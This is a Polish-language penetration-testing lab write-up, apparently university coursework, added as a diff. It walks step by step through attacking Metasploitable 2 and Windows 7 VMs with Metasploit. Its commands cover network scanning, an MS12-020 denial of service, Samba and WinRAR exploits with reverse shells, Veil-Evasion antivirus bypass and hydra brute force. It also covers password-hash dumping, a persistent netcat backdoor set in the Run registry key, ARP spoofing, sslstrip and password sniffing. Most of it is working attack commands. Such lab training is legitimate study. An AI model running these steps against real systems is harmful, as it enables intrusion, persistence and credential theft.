@@ -1,0 +1,237 @@
+================================================================
+Używając modułu auxiliary/scanner/discovery/arp_sweep przeprowadź wykrywanie hostów w sieci lokalnej.
+
+1. 
+Najpierw wyświetl informacje o module za pomocą komendy info.
+Ustal, jakie zmienne musisz ustawić: SHOST, SMAC, RHOSTS (dla przyspieszenia: THREADS)
+Wybierz moduł za pomocą komendy use: use auxiliary/scanner/discovery/arp_sweep
+Ustaw zmienne za pomocą serii komend set:
+set SHOST my_mac
+set SMAC my_ip
+set RHOSTS 172.16.129.0-254
+run 
+back 
+
+2.
+Przeprowadź skanowanie portów za pomocą modułów:
+a) auxiliary/scanner/discovery/udp_sweep:
+use auxiliary/scanner/discovery/udp_sweep
+set rhosts 172.16.129.0/24
+run
+back
+
+b) auxiliary/scanner/portscan/syn: (robię dla pierwszych stu portów)
+use auxiliary/scanner/portscan/syn
+set rhosts 172.16.129.0/24
+set ports 1-100
+set threads 10
+run
+back
+
+c) auxiliary/scanner/portscan/tcp:
+use auxiliary/scanner/portscan/tcp
+set rhosts 172.16.129.0/24
+set ports 1-100
+set threads 10
+run
+back
+
+3.  Sprawdź podatność Windows 7 na błąd MS12-020 (ms12_020_check).
+nmap -sV --script=rdp-vuln-ms12-020 -p 3389 ip_win7
+
+Następnie, jeżeli jest podatny, wykorzystaj tę podatność (ms12_020_maxchannelids), aby przeprowadzić atak DoS.
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+set rhost ip_maszyny
+exploit 
+back 
+
+Efektem jest restart celu.
+
+Zapoznaj się z opisem i sposobem działania podatności:
+ 
+Bez odpowiedniego patcha maszyna poddana exploitowi doświadcza ataku Denial of Service,
+objawiającym się serią Blue Screen of Death. Exploit działa następująco:
+wykorzystany jest fakt, że różne dystrybucje Windowsa nie przetwarzają poprawnie ramek sieciowych
+w pamięci, co pozwala atakującemu wykonać dowolny kod przesyłając syntetyczną ramkę
+Remote Desktop Protocol, która przetworzona daje dostęp do obiektów które 
+nie zostały poprawnie zainicjalizowane lub zostały usunięte.
+================================================================
+Exploit zdalny
+Wykorzystując exploit/multi/samba/usermap_script przeprowadź skuteczną eksploitację Metasploitable (z uzyskaniem shella).
+
+use exploit/multi/samba/usermap_script
+set rhost target_ip
+set payload cmd/unix/reverse
+set lhost kali_ip
+exploit
+
+Efektem exploitu jest uzyskanie shella celu. Można w nim wykonywać
+dowolny kod (co prezentuje np. komenda ls, zabraniee info o celu, np. uname -a)
+
+Zapoznaj się z opisem i sposobem działania podatności: 
+
+Exploit pozwala atakującemu na zdalne wykonanie dowolnego kodu,
+w momencie kiedy jest włączona opcja "username map script" w smb.conf, 
+poprzez metaznaki shella (m. in. funkcja SamrChangePassword, funkcje 
+zdalnej drukarki i file share management).
+
+====================================================
+Exploit lokalny
+Wykorzystując exploit/windows/fileformat/winrar_name_spoofing 
+przeprowadź skuteczną eksploitację Windows 7. 
+
+Jako payload wykorzystaj windows/meterpreter/reverse_tcp (set payload).
+Ustaw odpowiedni lhost. 
+Do obsłużenia połączeń przychodzących będziesz potrzebować 
+np. modułu exploit/multi/handler.
+
+sprawdzamy ipka kali: ifconfig
+use exploit/windows/fileformat/winrar_name_spoofing
+set payload windows/meterpreter/reverse_tcp
+set lhost kali_ip
+set lport 443
+exploit 
+
+w /root/.msf4/local/ pojawia się msf.zip ze spakowanym plikiem Readme.txt
+
+otwieramy nową konsolę i w niej:
+msfconsole 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost kali_ip
+set lport 443
+exploit 
+
+odpalamy serwer http serwujący dany plik, 
+-> albo cat msf.zip | nc -l -p 9000
+-> albo przez python3 -m http.server 
+
+na wirtualce z win7 pobieramy zainfekowany plik msf.zip z http serwera 
+i rozpakowujemy i odpalamy go. 
+w tym momencie w drugiej konsoli z multihandlerem powinien 
+otworzyć się reverse handler, w którym możemy na wirtualkę win7 przesyłać 
+komendy (np. zobaczyć różne informacje widoczne wewnątrz win7, ifconfig pokazuje to co ipconfig na win7 itp.)
+Musimy do niego przejść komendą:
+sessions -i id_sesji
+
+Zapoznaj się z opisem i sposobem działania podatności:
+exploit wykorzystuje podatność na spoofing nazw pliku w Winrar.
+W momencie kiedy otwieramy zainfekowane pliki zip, wykorzystujemy 
+nieścisłość w nazwach - pliki w .zip pochodzą z zapakowanego archiwum,
+ale nazwy plików użyte to rozpakowania archiwum pochodzą z "Local file header".
+pozwala to wykonać dowolny kod przy rozpakowywaniu pliku.
+
+=============================================================
+Unikanie antywirusów
+ Używając veil-evasion wygeneruj payload. 
+ Pamiętaj o ustawieniu LHOST.
+Sprawdź payload z bazą Virus Total.
+Przeglądnij wygenerowane pliki.
+Uruchom w Metasploit odpowiedni handler 
+(lista plików jest wygenerowana przez Veil). 
+Użyj komendy resource do załadowania odpowiedniego pliku.
+Prześlij payload na Windows 7 i uruchom go.
+ Poprawnie przeprowadzone kroki powinny skutkować
+ nową sesją zakomunikowaną w msfconsole na przykład następująco:
+ Meterpreter session 1 opened.
+ 
+ ./Veil-Evasion.py
+ w veil wpisujemy list, wśród listingu pojawi się m.in. c/meterpreter/rev_tcp_service
+ wpisujemy:
+ use c/meterpreter/rev_tcp_service
+ set LHOST kali_ip
+ set LPORT 8675
+ generate
+ 
+ podajemy nazwę pliku fname, wśród wygenerowanych plików znajduje się m.in. fname.rc, 
+ który jest skryptem metasploitowym. 
+ otwieramy konsolę w miejscu gdzie plik handlera został wygenerowany
+ i wpisujemy: msfconsole -resource fname.rc, otwiera się konsola multihandlera
+ 
+ na windowsa przesyłamy .exe z [odpowiednia ścieżka]/veil-output/compiled/fname.exe
+odpalamy binarkę na windowsie - w tym momencie w konsoli multihandlera w kali powinien się otworzyć zrotny shell,
+dzięki któremy uzyskujemy pełen dostęp do windowsa.  
+=============================================================
+Brute-force
+Wykorzystując hydra spróbuj przeprowadzić atak na jedną z usług dostępnych na Windows 7 lub Metasploitable 2.
+
+sprawdzamy czy na windowsie istnieje jakaś usługa, załóżmy że jest otwarty port ftp (możemy 
+to sprawdzić w msfconsole poprzez moduł auxiliary/scanner/portscan/syn)
+hydra -L file_with_possible_logins -P file_with_possible_passwords ftp://target_ip
+
+np. jeśli login i hasło na windowsa to odpowiednio robert i robert123, to 
+symulujemy sytuację, że wśród 20 loginów w pliku file_with_possible_logins 
+haseł jest robert, zaś jednym z haseł w pliku file_with_possible_passwords jest robert123 
+
+==============================================================================
+Post-exploit
+Przemigruj shell do innego procesu (np. explorer.exe): w otwartym metarpreterze: run post/windows/manage/migrate, 
+chyba domyślnie migruje do notepada.exe, jeśli chcemy do explorera, to:
+ps | grep explorer.exe  -> notujemy ex_pid 
+migrate ex_pid 
+
+Następnie zdobądź poniższe (zależne od systemu) informacje:
+
+Informacje o systemie (wersja, wersja jądra): sysinfo
+Ustawienia DNS, sieci: ipconfig /all
+Informacje o kontach i hasłach (hashe haseł, jeżeli jest to możliwe). 
+net user
+getsystem
+run post/windows/gather/hashdump 
+
+Zainstalowane oprogramowanie. WMIC.exe product get name
+Aktualnie uruchomione procesy i usługi: tasklist
+
+Następnie:
+Używając run post/windows/manage/enable_rdp stwórz konto lokalne, podłącz się za pomocą RDP a następnie usuń ślady działalności:
+run post/windows/manage/enable_rdp username=robert password=pwd
+w innej konsoli: rdesktop -u robert -p pwd ip_win7
+resource /root/.msf4/loot/20171029173343_default_192.168.0.110_host.windows.cle_244494.txt
+
+Podrzuć na maszynę Windows 7 zdalnie najnowszą wersję winpmem ze strony: https://github.com/google/rekall/releases. Następnie wykonaj zrzut pamięci systemu.
+
+Umieść Netcat jako backdoor:
+skompilowana binarka nc.exe znajduje się w /usr/share/windows-binaries/nc.exe,
+skopiuj ją do C:\Windows\System32\nc.exe,
+aby Netcat uruchamiał się podczas startu systemu należy dodać do klucza rejestru HKLM\Software\Microsoft\Windows\CurrentVersion\Run wartość nc z danymi: C:\Windows\System32\nc.exe -Ldp 444 -e cmd.exe
+następnie możesz zrestartować komputer z Windows 7 aby sprawdzić, czy aplikacja się uruchomi,
+podłącz się za pomocą nc z Kali Linuksa do odpowiedniego portu na Windows.
+upload /usr/share/windows-binaries/nc.exe C:\Windows\System32\nc.exe
+reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v nc -d 'C:\Windows\System32\nc.exe -Ldp 444 -e cmd.exe'
+shell
+netsh firewall add portopening TCP 444 "Service Firewall" ENABLE ALL
+
+Umieść dedykowaną usługę metepretera (metsvc) jako backdoor. W tym celu:
+
+wykonaj run metsvc,
+odpowiednio skonfiguruj exploit/multi/handler i podłącz się do działającej usługi - 
+wystarczy w multihandlerze ustawić wylistowany port (host zostawiay jaki był), robimy exploit i sessions -i new_id
+
+========================================================================================================
+ARP spoofing
+Przeprowadź atak typu man-in-the-middle (-M – zapoznaj się z opisem opcji) za pomocą protokołu ARP i narzędzia ettercap. Aby włączyć tryb tekstowy użyj opcji -T.
+Maszyną, która powinna przechwytywać ruch jest Kali. Powinna ona udawać bramę domyślną. Naszym obiektem ataku są maszyny Metasploitable 2 i Windows 7.
+Zweryfikuj działanie ataku poprzez obserwowanie wyjścia z komendy ettercap podczas generowania ruchu sieciowego z maszyny Windows 7 do:
+a) sieci zewnętrznej,
+b) maszyny Metasploitable 2.
+
+a) ettercap -T -i eth0 -M arp ip_win7 /sieć_zewn.//
+b) ettercap -T -i eth0 -M arp ip_win7 /ip_msp//
+
+Przeprowadź atak typu man-in-the-middle na protokół SSL z użyciem pluginu sslstrip w ettercap.
+Spróbuj na Windows 7 odwiedzić jakieś strony korzystające z HTTPS, np.:
+
+google.com
+jira.iisg.agh.edu.pl
+
+iptables -t nat -A PREROUTING -p tcp –-destination-port 80 -j REDIRECT -–to-ports 1000
+echo 1 > /proc/sys/net/ipv4/ip_forward
+sslstrip (ew. patrzymy na logi: tail -f sslstrip.log)
+
+na wyjściu zaszyfrowane klucze 
+
+Wychwytywanie interesujących danych
+Używając narzędzia urlsnarf zbierz adresy WWW odwiedzane z maszyny Windows 7. 
+ettercap -T -i eth0 -M arp:remote  /192.168.0.110// /192.168.0.1//
+urlsnarf -i eth0
+Używając narzędzia dsniff lub modułu auxiliary/sniffer/psnuffle spróbuj przechwycić hasła. Aby zobaczyć efekt musisz spróbować zalogować się na jakąś usługę z Metasploitable 2 (np. FTP) maszyny.
